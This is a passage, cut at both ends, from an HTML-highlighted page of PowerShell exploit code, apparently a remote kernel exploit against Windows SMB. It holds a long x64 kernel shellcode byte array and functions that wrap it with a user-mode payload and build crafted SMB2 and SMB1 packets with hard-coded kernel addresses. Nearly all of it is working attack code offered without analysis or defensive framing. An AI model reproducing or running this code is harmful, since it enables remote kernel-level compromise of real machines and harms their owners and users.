class="number">0</span>x01,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x48,<span class="number">0</span>x83,</span><br><span class="line"><span class="number">0</span>xEC,<span class="number">0</span>x78,<span class="number">0</span>x41,<span class="number">0</span>x5F,<span class="number">0</span>x41,<span class="number">0</span>x5E,<span class="number">0</span>x41,<span class="number">0</span>x5D,<span class="number">0</span>x41,<span class="number">0</span>x5C,<span class="number">0</span>x41,<span class="number">0</span>x5B,<span class="number">0</span>x41,<span class="number">0</span>x5A,<span class="number">0</span>x41,<span class="number">0</span>x59,</span><br><span class="line"><span class="number">0</span>x41,<span class="number">0</span>x58,<span class="number">0</span>x5D,<span class="number">0</span>x5F,<span class="number">0</span>x5E,<span class="number">0</span>x5A,<span class="number">0</span>x59,<span class="number">0</span>x5B,<span class="number">0</span>x58,<span class="number">0</span>x65,<span class="number">0</span>x48,<span class="number">0</span>x8B,<span class="number">0</span>x24,<span class="number">0</span>x25,<span class="number">0</span>x10,<span class="number">0</span>x00,</span><br><span class="line"><span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x0F,<span class="number">0</span>x01,<span class="number">0</span>xF8,<span class="number">0</span>xFF,<span class="number">0</span>x24,<span class="number">0</span>x25,<span class="number">0</span>xF8,<span class="number">0</span>x0F,<span class="number">0</span>xD0,<span class="number">0</span>xFF,<span class="number">0</span>x56,<span class="number">0</span>x41,<span class="number">0</span>x57,<span class="number">0</span>x41,</span><br><span class="line"><span class="number">0</span>x56,<span class="number">0</span>x41,<span class="number">0</span>x55,<span class="number">0</span>x41,<span class="number">0</span>x54,<span class="number">0</span>x53,<span class="number">0</span>x55,<span class="number">0</span>x48,<span class="number">0</span>x89,<span class="number">0</span>xE5,<span class="number">0</span>x66,<span class="number">0</span>x83,<span class="number">0</span>xE4,<span class="number">0</span>xF0,<span class="number">0</span>x48,<span class="number">0</span>x83,</span><br><span class="line"><span class="number">0</span>xEC,<span class="number">0</span>x20,<span class="number">0</span>x4C,<span class="number">0</span>x8D,<span class="number">0</span>x35,<span class="number">0</span>xE3,<span class="number">0</span>xFF,<span class="number">0</span>xFF,<span class="number">0</span>xFF,<span class="number">0</span>x65,<span class="number">0</span>x4C,<span class="number">0</span>x8B,<span class="number">0</span>x3C,<span class="number">0</span>x25,<span class="number">0</span>x38,<span class="number">0</span>x00,</span><br><span class="line"><span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x4D,<span class="number">0</span>x8B,<span class="number">0</span>x7F,<span class="number">0</span>x04,<span class="number">0</span>x49,<span class="number">0</span>xC1,<span class="number">0</span>xEF,<span class="number">0</span>x0C,<span class="number">0</span>x49,<span class="number">0</span>xC1,<span class="number">0</span>xE7,<span class="number">0</span>x0C,<span class="number">0</span>x49,<span class="number">0</span>x81,</span><br><span class="line"><span class="number">0</span>xEF,<span class="number">0</span>x00,<span class="number">0</span>x10,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x49,<span class="number">0</span>x8B,<span class="number">0</span>x37,<span class="number">0</span>x66,<span class="number">0</span>x81,<span class="number">0</span>xFE,<span class="number">0</span>x4D,<span class="number">0</span>x5A,<span class="number">0</span>x75,<span class="number">0</span>xEF,<span class="number">0</span>x41,</span><br><span class="line"><span class="number">0</span>xBB,<span class="number">0</span>x5C,<span class="number">0</span>x72,<span class="number">0</span>x11,<span class="number">0</span>x62,<span class="number">0</span>xE8,<span class="number">0</span>x18,<span class="number">0</span>x02,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x48,<span class="number">0</span>x89,<span class="number">0</span>xC6,<span class="number">0</span>x48,<span class="number">0</span>x81,<span class="number">0</span>xC6,</span><br><span class="line"><span class="number">0</span>x08,<span class="number">0</span>x03,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x41,<span class="number">0</span>xBB,<span class="number">0</span>x7A,<span class="number">0</span>xBA,<span class="number">0</span>xA3,<span class="number">0</span>x30,<span class="number">0</span>xE8,<span class="number">0</span>x03,<span class="number">0</span>x02,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x48,</span><br><span class="line"><span class="number">0</span>x89,<span class="number">0</span>xF1,<span class="number">0</span>x48,<span class="number">0</span>x39,<span class="number">0</span>xF0,<span class="number">0</span>x77,<span class="number">0</span>x11,<span class="number">0</span>x48,<span class="number">0</span>x8D,<span class="number">0</span>x90,<span class="number">0</span>x00,<span class="number">0</span>x05,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x48,<span class="number">0</span>x39,</span><br><span class="line"><span class="number">0</span>xF2,<span class="number">0</span>x72,<span class="number">0</span>x05,<span class="number">0</span>x48,<span class="number">0</span>x29,<span class="number">0</span>xC6,<span class="number">0</span>xEB,<span class="number">0</span>x08,<span class="number">0</span>x48,<span class="number">0</span>x8B,<span class="number">0</span>x36,<span class="number">0</span>x48,<span class="number">0</span>x39,<span class="number">0</span>xCE,<span class="number">0</span>x75,<span class="number">0</span>xE2,</span><br><span class="line"><span class="number">0</span>x49,<span class="number">0</span>x89,<span class="number">0</span>xF4,<span class="number">0</span>x31,<span class="number">0</span>xDB,<span class="number">0</span>x89,<span class="number">0</span>xD9,<span class="number">0</span>x83,<span class="number">0</span>xC1,<span class="number">0</span>x04,<span class="number">0</span>x81,<span class="number">0</span>xF9,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x01,<span class="number">0</span>x00,</span><br><span class="line"><span class="number">0</span>x0F,<span class="number">0</span>x8D,<span class="number">0</span>x66,<span class="number">0</span>x01,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x4C,<span class="number">0</span>x89,<span class="number">0</span>xF2,<span class="number">0</span>x89,<span class="number">0</span>xCB,<span class="number">0</span>x41,<span class="number">0</span>xBB,<span class="number">0</span>x66,<span class="number">0</span>x55,<span class="number">0</span>xA2,</span><br><span class="line"><span class="number">0</span>x4B,<span class="number">0</span>xE8,<span class="number">0</span>xBC,<span class="number">0</span>x01,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x85,<span class="number">0</span>xC0,<span class="number">0</span>x75,<span class="number">0</span>xDB,<span class="number">0</span>x49,<span class="number">0</span>x8B,<span class="number">0</span>x0E,<span class="number">0</span>x41,<span class="number">0</span>xBB,<span class="number">0</span>xA3,</span><br><span class="line"><span class="number">0</span>x6F,<span class="number">0</span>x72,<span class="number">0</span>x2D,<span class="number">0</span>xE8,<span class="number">0</span>xAA,<span class="number">0</span>x01,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x48,<span class="number">0</span>x89,<span class="number">0</span>xC6,<span class="number">0</span>xE8,<span class="number">0</span>x50,<span class="number">0</span>x01,<span class="number">0</span>x00,<span class="number">0</span>x00,</span><br><span class="line"><span class="number">0</span>x41,<span class="number">0</span>x81,<span class="number">0</span>xF9,<span class="number">0</span>xBF,<span class="number">0</span>x77,<span class="number">0</span>x1F,<span class="number">0</span>xDD,<span class="number">0</span>x75,<span class="number">0</span>xBC,<span class="number">0</span>x49,<span class="number">0</span>x8B,<span class="number">0</span>x1E,<span class="number">0</span>x4D,<span class="number">0</span>x8D,<span class="number">0</span>x6E,<span class="number">0</span>x10,</span><br><span class="line"><span class="number">0</span>x4C,<span class="number">0</span>x89,<span class="number">0</span>xEA,<span class="number">0</span>x48,<span class="number">0</span>x89,<span class="number">0</span>xD9,<span class="number">0</span>x41,<span class="number">0</span>xBB,<span class="number">0</span>xE5,<span class="number">0</span>x24,<span class="number">0</span>x11,<span class="number">0</span>xDC,<span class="number">0</span>xE8,<span class="number">0</span>x81,<span class="number">0</span>x01,<span class="number">0</span>x00,</span><br><span class="line"><span class="number">0</span>x00,<span class="number">0</span>x6A,<span class="number">0</span>x40,<span class="number">0</span>x68,<span class="number">0</span>x00,<span class="number">0</span>x10,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x4D,<span class="number">0</span>x8D,<span class="number">0</span>x4E,<span class="number">0</span>x08,<span class="number">0</span>x49,<span class="number">0</span>xC7,<span class="number">0</span>x01,<span class="number">0</span>x00,</span><br><span class="line"><span class="number">0</span>x10,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x4D,<span class="number">0</span>x31,<span class="number">0</span>xC0,<span class="number">0</span>x4C,<span class="number">0</span>x89,<span class="number">0</span>xF2,<span class="number">0</span>x31,<span class="number">0</span>xC9,<span class="number">0</span>x48,<span class="number">0</span>x89,<span class="number">0</span>x0A,<span class="number">0</span>x48,<span class="number">0</span>xF7,</span><br><span class="line"><span class="number">0</span>xD1,<span class="number">0</span>x41,<span class="number">0</span>xBB,<span class="number">0</span>x4B,<span class="number">0</span>xCA,<span class="number">0</span>x0A,<span class="number">0</span>xEE,<span class="number">0</span>x48,<span class="number">0</span>x83,<span class="number">0</span>xEC,<span class="number">0</span>x20,<span class="number">0</span>xE8,<span class="number">0</span>x52,<span class="number">0</span>x01,<span class="number">0</span>x00,<span class="number">0</span>x00,</span><br><span class="line"><span class="number">0</span>x85,<span class="number">0</span>xC0,<span class="number">0</span>x0F,<span class="number">0</span>x85,<span class="number">0</span>xC8,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x49,<span class="number">0</span>x8B,<span class="number">0</span>x3E,<span class="number">0</span>x48,<span class="number">0</span>x8D,<span class="number">0</span>x35,<span class="number">0</span>xE9,<span class="number">0</span>x00,</span><br><span class="line"><span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x31,<span class="number">0</span>xC9,<span class="number">0</span>x66,<span class="number">0</span>x03,<span class="number">0</span>x0D,<span class="number">0</span>xD7,<span class="number">0</span>x01,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x66,<span class="number">0</span>x81,<span class="number">0</span>xC1,<span class="number">0</span>xF9,<span class="number">0</span>x00,</span><br><span class="line"><span class="number">0</span>xF3,<span class="number">0</span>xA4,<span class="number">0</span>x48,<span class="number">0</span>x89,<span class="number">0</span>xDE,<span class="number">0</span>x48,<span class="number">0</span>x81,<span class="number">0</span>xC6,<span class="number">0</span>x08,<span class="number">0</span>x03,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x48,<span class="number">0</span>x89,<span class="number">0</span>xF1,<span class="number">0</span>x48,</span><br><span class="line"><span class="number">0</span>x8B,<span class="number">0</span>x11,<span class="number">0</span>x4C,<span class="number">0</span>x29,<span class="number">0</span>xE2,<span class="number">0</span>x51,<span class="number">0</span>x52,<span class="number">0</span>x48,<span class="number">0</span>x89,<span class="number">0</span>xD1,<span class="number">0</span>x48,<span class="number">0</span>x83,<span class="number">0</span>xEC,<span class="number">0</span>x20,<span class="number">0</span>x41,<span class="number">0</span>xBB,</span><br><span class="line"><span class="number">0</span>x26,<span class="number">0</span>x40,<span class="number">0</span>x36,<span class="number">0</span>x9D,<span class="number">0</span>xE8,<span class="number">0</span>x09,<span class="number">0</span>x01,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x48,<span class="number">0</span>x83,<span class="number">0</span>xC4,<span class="number">0</span>x20,<span class="number">0</span>x5A,<span class="number">0</span>x59,<span class="number">0</span>x48,</span><br><span class="line"><span class="number">0</span>x85,<span class="number">0</span>xC0,<span class="number">0</span>x74,<span class="number">0</span>x18,<span class="number">0</span>x48,<span class="number">0</span>x8B,<span class="number">0</span>x80,<span class="number">0</span>xC8,<span class="number">0</span>x02,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x48,<span class="number">0</span>x85,<span class="number">0</span>xC0,<span class="number">0</span>x74,<span class="number">0</span>x0C,</span><br><span class="line"><span class="number">0</span>x48,<span class="number">0</span>x83,<span class="number">0</span>xC2,<span class="number">0</span>x4C,<span class="number">0</span>x8B,<span class="number">0</span>x02,<span class="number">0</span>x0F,<span class="number">0</span>xBA,<span class="number">0</span>xE0,<span class="number">0</span>x05,<span class="number">0</span>x72,<span class="number">0</span>x05,<span class="number">0</span>x48,<span class="number">0</span>x8B,<span class="number">0</span>x09,<span class="number">0</span>xEB,</span><br><span class="line"><span class="number">0</span>xBE,<span class="number">0</span>x48,<span class="number">0</span>x83,<span class="number">0</span>xEA,<span class="number">0</span>x4C,<span class="number">0</span>x49,<span class="number">0</span>x89,<span class="number">0</span>xD4,<span class="number">0</span>x31,<span class="number">0</span>xD2,<span class="number">0</span>x80,<span class="number">0</span>xC2,<span class="number">0</span>x90,<span class="number">0</span>x31,<span class="number">0</span>xC9,<span class="number">0</span>x41,</span><br><span class="line"><span class="number">0</span>xBB,<span class="number">0</span>x26,<span class="number">0</span>xAC,<span class="number">0</span>x50,<span class="number">0</span>x91,<span class="number">0</span>xE8,<span class="number">0</span>xC8,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x48,<span class="number">0</span>x89,<span class="number">0</span>xC1,<span class="number">0</span>x4C,<span class="number">0</span>x8D,<span class="number">0</span>x89,</span><br><span class="line"><span class="number">0</span>x80,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x41,<span class="number">0</span>xC6,<span class="number">0</span>x01,<span class="number">0</span>xC3,<span class="number">0</span>x4C,<span class="number">0</span>x89,<span class="number">0</span>xE2,<span class="number">0</span>x49,<span class="number">0</span>x89,<span class="number">0</span>xC4,<span class="number">0</span>x4D,<span class="number">0</span>x31,</span><br><span class="line"><span class="number">0</span>xC0,<span class="number">0</span>x41,<span class="number">0</span>x50,<span class="number">0</span>x6A,<span class="number">0</span>x01,<span class="number">0</span>x49,<span class="number">0</span>x8B,<span class="number">0</span>x06,<span class="number">0</span>x50,<span class="number">0</span>x41,<span class="number">0</span>x50,<span class="number">0</span>x48,<span class="number">0</span>x83,<span class="number">0</span>xEC,<span class="number">0</span>x20,<span class="number">0</span>x41,</span><br><span class="line"><span class="number">0</span>xBB,<span class="number">0</span>xAC,<span class="number">0</span>xCE,<span class="number">0</span>x55,<span class="number">0</span>x4B,<span class="number">0</span>xE8,<span class="number">0</span>x98,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x31,<span class="number">0</span>xD2,<span class="number">0</span>x52,<span class="number">0</span>x52,<span class="number">0</span>x41,<span class="number">0</span>x58,</span><br><span class="line"><span class="number">0</span>x41,<span class="number">0</span>x59,<span class="number">0</span>x4C,<span class="number">0</span>x89,<span class="number">0</span>xE1,<span class="number">0</span>x41,<span class="number">0</span>xBB,<span class="number">0</span>x18,<span class="number">0</span>x38,<span class="number">0</span>x09,<span class="number">0</span>x9E,<span class="number">0</span>xE8,<span class="number">0</span>x82,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,</span><br><span class="line"><span class="number">0</span>x4C,<span class="number">0</span>x89,<span class="number">0</span>xE9,<span class="number">0</span>x41,<span class="number">0</span>xBB,<span class="number">0</span>x22,<span class="number">0</span>xB7,<span class="number">0</span>xB3,<span class="number">0</span>x7D,<span class="number">0</span>xE8,<span class="number">0</span>x74,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x48,<span class="number">0</span>x89,</span><br><span class="line"><span class="number">0</span>xD9,<span class="number">0</span>x41,<span class="number">0</span>xBB,<span class="number">0</span>x0D,<span class="number">0</span>xE2,<span class="number">0</span>x4D,<span class="number">0</span>x85,<span class="number">0</span>xE8,<span class="number">0</span>x66,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x48,<span class="number">0</span>x89,<span class="number">0</span>xEC,<span class="number">0</span>x5D,</span><br><span class="line"><span class="number">0</span>x5B,<span class="number">0</span>x41,<span class="number">0</span>x5C,<span class="number">0</span>x41,<span class="number">0</span>x5D,<span class="number">0</span>x41,<span class="number">0</span>x5E,<span class="number">0</span>x41,<span class="number">0</span>x5F,<span class="number">0</span>x5E,<span class="number">0</span>xC3,<span class="number">0</span>xE9,<span class="number">0</span>xB5,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,</span><br><span class="line"><span class="number">0</span>x4D,<span class="number">0</span>x31,<span class="number">0</span>xC9,<span class="number">0</span>x31,<span class="number">0</span>xC0,<span class="number">0</span>xAC,<span class="number">0</span>x41,<span class="number">0</span>xC1,<span class="number">0</span>xC9,<span class="number">0</span>x0D,<span class="number">0</span>x3C,<span class="number">0</span>x61,<span class="number">0</span>x7C,<span class="number">0</span>x02,<span class="number">0</span>x2C,<span class="number">0</span>x20,</span><br><span class="line"><span class="number">0</span>x41,<span class="number">0</span>x01,<span class="number">0</span>xC1,<span class="number">0</span>x38,<span class="number">0</span>xE0,<span class="number">0</span>x75,<span class="number">0</span>xEC,<span class="number">0</span>xC3,<span class="number">0</span>x31,<span class="number">0</span>xD2,<span class="number">0</span>x65,<span class="number">0</span>x48,<span class="number">0</span>x8B,<span class="number">0</span>x52,<span class="number">0</span>x60,<span class="number">0</span>x48,</span><br><span class="line"><span class="number">0</span>x8B,<span class="number">0</span>x52,<span class="number">0</span>x18,<span class="number">0</span>x48,<span class="number">0</span>x8B,<span class="number">0</span>x52,<span class="number">0</span>x20,<span class="number">0</span>x48,<span class="number">0</span>x8B,<span class="number">0</span>x12,<span class="number">0</span>x48,<span class="number">0</span>x8B,<span class="number">0</span>x72,<span class="number">0</span>x50,<span class="number">0</span>x48,<span class="number">0</span>x0F,</span><br><span class="line"><span class="number">0</span>xB7,<span class="number">0</span>x4A,<span class="number">0</span>x4A,<span class="number">0</span>x45,<span class="number">0</span>x31,<span class="number">0</span>xC9,<span class="number">0</span>x31,<span class="number">0</span>xC0,<span class="number">0</span>xAC,<span class="number">0</span>x3C,<span class="number">0</span>x61,<span class="number">0</span>x7C,<span class="number">0</span>x02,<span class="number">0</span>x2C,<span class="number">0</span>x20,<span class="number">0</span>x41,</span><br><span class="line"><span class="number">0</span>xC1,<span class="number">0</span>xC9,<span class="number">0</span>x0D,<span class="number">0</span>x41,<span class="number">0</span>x01,<span class="number">0</span>xC1,<span class="number">0</span>xE2,<span class="number">0</span>xEE,<span class="number">0</span>x45,<span class="number">0</span>x39,<span class="number">0</span>xD9,<span class="number">0</span>x75,<span class="number">0</span>xDA,<span class="number">0</span>x4C,<span class="number">0</span>x8B,<span class="number">0</span>x7A,</span><br><span class="line"><span class="number">0</span>x20,<span class="number">0</span>xC3,<span class="number">0</span>x4C,<span class="number">0</span>x89,<span class="number">0</span>xF8,<span class="number">0</span>x41,<span class="number">0</span>x51,<span class="number">0</span>x41,<span class="number">0</span>x50,<span class="number">0</span>x52,<span class="number">0</span>x51,<span class="number">0</span>x56,<span class="number">0</span>x48,<span class="number">0</span>x89,<span class="number">0</span>xC2,<span class="number">0</span>x8B,</span><br><span class="line"><span class="number">0</span>x42,<span class="number">0</span>x3C,<span class="number">0</span>x48,<span class="number">0</span>x01,<span class="number">0</span>xD0,<span class="number">0</span>x8B,<span class="number">0</span>x80,<span class="number">0</span>x88,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x48,<span class="number">0</span>x01,<span class="number">0</span>xD0,<span class="number">0</span>x50,<span class="number">0</span>x8B,</span><br><span class="line"><span class="number">0</span>x48,<span class="number">0</span>x18,<span class="number">0</span>x44,<span class="number">0</span>x8B,<span class="number">0</span>x40,<span class="number">0</span>x20,<span class="number">0</span>x49,<span class="number">0</span>x01,<span class="number">0</span>xD0,<span class="number">0</span>x48,<span class="number">0</span>xFF,<span class="number">0</span>xC9,<span class="number">0</span>x41,<span class="number">0</span>x8B,<span class="number">0</span>x34,<span class="number">0</span>x88,</span><br><span class="line"><span class="number">0</span>x48,<span class="number">0</span>x01,<span class="number">0</span>xD6,<span class="number">0</span>xE8,<span class="number">0</span>x78,<span class="number">0</span>xFF,<span class="number">0</span>xFF,<span class="number">0</span>xFF,<span class="number">0</span>x45,<span class="number">0</span>x39,<span class="number">0</span>xD9,<span class="number">0</span>x75,<span class="number">0</span>xEC,<span class="number">0</span>x58,<span class="number">0</span>x44,<span class="number">0</span>x8B,</span><br><span class="line"><span class="number">0</span>x40,<span class="number">0</span>x24,<span class="number">0</span>x49,<span class="number">0</span>x01,<span class="number">0</span>xD0,<span class="number">0</span>x66,<span class="number">0</span>x41,<span class="number">0</span>x8B,<span class="number">0</span>x0C,<span class="number">0</span>x48,<span class="number">0</span>x44,<span class="number">0</span>x8B,<span class="number">0</span>x40,<span class="number">0</span>x1C,<span class="number">0</span>x49,<span class="number">0</span>x01,</span><br><span class="line"><span class="number">0</span>xD0,<span class="number">0</span>x41,<span class="number">0</span>x8B,<span class="number">0</span>x04,<span class="number">0</span>x88,<span class="number">0</span>x48,<span class="number">0</span>x01,<span class="number">0</span>xD0,<span class="number">0</span>x5E,<span class="number">0</span>x59,<span class="number">0</span>x5A,<span class="number">0</span>x41,<span class="number">0</span>x58,<span class="number">0</span>x41,<span class="number">0</span>x59,<span class="number">0</span>x41,</span><br><span class="line"><span class="number">0</span>x5B,<span class="number">0</span>x41,<span class="number">0</span>x53,<span class="number">0</span>xFF,<span class="number">0</span>xE0,<span class="number">0</span>x56,<span class="number">0</span>x41,<span class="number">0</span>x57,<span class="number">0</span>x55,<span class="number">0</span>x48,<span class="number">0</span>x89,<span class="number">0</span>xE5,<span class="number">0</span>x48,<span class="number">0</span>x83,<span class="number">0</span>xEC,<span class="number">0</span>x20,</span><br><span class="line"><span class="number">0</span>x41,<span class="number">0</span>xBB,<span class="number">0</span>xDA,<span class="number">0</span>x16,<span class="number">0</span>xAF,<span class="number">0</span>x92,<span class="number">0</span>xE8,<span class="number">0</span>x4D,<span class="number">0</span>xFF,<span class="number">0</span>xFF,<span class="number">0</span>xFF,<span class="number">0</span>x31,<span class="number">0</span>xC9,<span class="number">0</span>x51,<span class="number">0</span>x51,<span class="number">0</span>x51,</span><br><span class="line"><span class="number">0</span>x51,<span class="number">0</span>x41,<span class="number">0</span>x59,<span class="number">0</span>x4C,<span class="number">0</span>x8D,<span class="number">0</span>x05,<span class="number">0</span>x1A,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x5A,<span class="number">0</span>x48,<span class="number">0</span>x83,<span class="number">0</span>xEC,<span class="number">0</span>x20,<span class="number">0</span>x41,</span><br><span class="line"><span class="number">0</span>xBB,<span class="number">0</span>x46,<span class="number">0</span>x45,<span class="number">0</span>x1B,<span class="number">0</span>x22,<span class="number">0</span>xE8,<span class="number">0</span>x68,<span class="number">0</span>xFF,<span class="number">0</span>xFF,<span class="number">0</span>xFF,<span class="number">0</span>x48,<span class="number">0</span>x89,<span class="number">0</span>xEC,<span class="number">0</span>x5D,<span class="number">0</span>x41,<span class="number">0</span>x5F,</span><br><span class="line"><span class="number">0</span>x5E,<span class="number">0</span>xC3)</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$shellcode</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_kernel_user_payload</span><span class="params">(<span class="variable">$ring3</span>)</span></span> &#123;</span><br><span class="line">    <span class="variable">$sc</span> = make_kernel_shellcode</span><br><span class="line">    <span class="variable">$sc</span> += [<span class="type">bitconverter</span>]::GetBytes([<span class="type">uint16</span>] (<span class="variable">$ring3</span>.length))</span><br><span class="line">    <span class="variable">$sc</span> += <span class="variable">$ring3</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$sc</span></span><br><span class="line"> &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_smb2_payload_headers_packet</span><span class="params">()</span></span>&#123;</span><br><span class="line">    [<span class="built_in">Byte</span>[]] <span class="variable">$pkt</span> = [<span class="built_in">Byte</span>[]](<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>xff,<span class="number">0</span>xf7,<span class="number">0</span>xFE) + [<span class="type">system.Text.Encoding</span>]::ASCII.GetBytes(<span class="string">"SMB"</span>) + [<span class="built_in">Byte</span>[]](<span class="number">0</span>x00)*<span class="number">124</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$pkt</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_smb2_payload_body_packet</span><span class="params">(<span class="variable">$kernel_user_payload</span>)</span></span> &#123;</span><br><span class="line">    <span class="variable">$pkt_max_len</span> = <span class="number">4204</span></span><br><span class="line">    <span class="variable">$pkt_setup_len</span> = <span class="number">497</span></span><br><span class="line">    <span class="variable">$pkt_max_payload</span> = <span class="variable">$pkt_max_len</span> - <span class="variable">$pkt_setup_len</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#padding</span></span><br><span class="line">    [<span class="built_in">Byte</span>[]] <span class="variable">$pkt</span> = [<span class="built_in">Byte</span>[]] (<span class="number">0</span>x00) * <span class="number">0</span>x8</span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x03,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00</span><br><span class="line">    <span class="variable">$pkt</span> += [<span class="built_in">Byte</span>[]] (<span class="number">0</span>x00) * <span class="number">0</span>x1c</span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x03,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00</span><br><span class="line">     <span class="variable">$pkt</span> += [<span class="built_in">Byte</span>[]] (<span class="number">0</span>x00) * <span class="number">0</span>x74</span><br><span class="line"></span><br><span class="line"><span class="comment"># KI_USER_SHARED_DATA addresses</span></span><br><span class="line">    <span class="variable">$pkt</span> += [<span class="built_in">Byte</span>[]] (<span class="number">0</span>xb0,<span class="number">0</span>x00,<span class="number">0</span>xd0,<span class="number">0</span>xff,<span class="number">0</span>xff,<span class="number">0</span>xff,<span class="number">0</span>xff,<span class="number">0</span>xff) * <span class="number">2</span> <span class="comment"># x64 address</span></span><br><span class="line">    <span class="variable">$pkt</span> += [<span class="built_in">Byte</span>[]] (<span class="number">0</span>x00) * <span class="number">0</span>x10</span><br><span class="line">    <span class="variable">$pkt</span> += [<span class="built_in">Byte</span>[]] (<span class="number">0</span>xc0,<span class="number">0</span>xf0,<span class="number">0</span>xdf,<span class="number">0</span>xff) * <span class="number">2</span>                 <span class="comment"># x86 address</span></span><br><span class="line">    <span class="variable">$pkt</span> += [<span class="built_in">Byte</span>[]] (<span class="number">0</span>x00) * <span class="number">0</span>xc4</span><br><span class="line"></span><br><span class="line">    <span class="comment"># payload addreses</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x90,<span class="number">0</span>xf1,<span class="number">0</span>xdf,<span class="number">0</span>xff</span><br><span class="line">    <span class="variable">$pkt</span> += [<span class="built_in">Byte</span>[]] (<span class="number">0</span>x00) * <span class="number">0</span>x4</span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>xf0,<span class="number">0</span>xf1,<span class="number">0</span>xdf,<span class="number">0</span>xff</span><br><span class="line">    <span class="variable">$pkt</span> += [<span class="built_in">Byte</span>[]] (<span class="number">0</span>x00) * <span class="number">0</span>x40</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>xf0,<span class="number">0</span>x01,<span class="number">0</span>xd0,<span class="number">0</span>xff,<span class="number">0</span>xff,<span class="number">0</span>xff,<span class="number">0</span>xff,<span class="number">0</span>xff</span><br><span class="line">    <span class="variable">$pkt</span> += [<span class="built_in">Byte</span>[]] (<span class="number">0</span>x00) * <span class="number">0</span>x8</span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x02,<span class="number">0</span>xd0,<span class="number">0</span>xff,<span class="number">0</span>xff,<span class="number">0</span>xff,<span class="number">0</span>xff,<span class="number">0</span>xff</span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="variable">$kernel_user_payload</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># fill out the rest, this can be randomly generated</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00 * (<span class="variable">$pkt_max_payload</span> - <span class="variable">$kernel_user_payload</span>.length)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>  <span class="variable">$pkt</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_smb1_echo_packet</span><span class="params">(<span class="variable">$tree_id</span>, <span class="variable">$user_id</span>)</span></span> &#123;</span><br><span class="line">    [<span class="built_in">Byte</span>[]]  <span class="variable">$pkt</span> = [<span class="built_in">Byte</span>[]] (<span class="number">0</span>x00)               <span class="comment"># type</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x31       <span class="comment"># len = 49</span></span><br><span class="line">    <span class="variable">$pkt</span> += [<span class="built_in">Byte</span>[]] (<span class="number">0</span>xff) + <span class="variable">$enc</span>.GetBytes(<span class="string">"SMB"</span>)            <span class="comment"># SMB1</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x2b               <span class="comment"># Echo</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00   <span class="comment"># Success</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x18               <span class="comment"># flags</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x07,<span class="number">0</span>xc0           <span class="comment"># flags2</span></span><br><span 